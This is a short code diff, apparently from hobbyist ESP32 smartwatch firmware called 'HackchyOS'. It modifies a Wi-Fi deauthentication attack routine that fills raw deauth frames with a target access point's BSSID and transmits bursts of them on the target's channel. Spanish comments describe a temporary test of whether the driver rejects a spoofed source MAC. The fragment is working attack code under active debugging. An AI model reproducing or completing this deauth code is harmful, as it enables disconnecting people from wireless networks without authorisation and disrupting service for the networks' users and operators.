@@ -203,8 +203,13 @@ static uint8_t deauthFrame[26] = {
 void WatchyHackchyOS::deauthBurst() {
   if (deauthSel < 0 || deauthSel >= wifiCount) { deauthRunning = false; return; }
   const uint8_t *bssid = wifiBSSID[deauthSel];
-  memcpy(deauthFrame + 10, bssid, 6);
-  memcpy(deauthFrame + 16, bssid, 6);
+  // DIAGNÓSTICO TEMPORAL (quitar en cuanto tengamos el código de error):
+  // probamos con la MAC propia como origen en vez de la del AP objetivo,
+  // para ver si el 0x102 viene de que el driver rechaza falsear el origen.
+  uint8_t ownMac[6];
+  esp_wifi_get_mac(WIFI_IF_STA, ownMac);
+  memcpy(deauthFrame + 10, ownMac, 6);   // origen: iba bssid, ahora MAC propia
+  memcpy(deauthFrame + 16, bssid, 6);    // BSSID del objetivo: se mantiene
   esp_wifi_set_channel(wifiChan[deauthSel], WIFI_SECOND_CHAN_NONE);
   for (int i = 0; i < 10; i++) {
     // en_sys_seq = true: en IDF 5.x (core ESP32 3.x), si la interfaz ya está
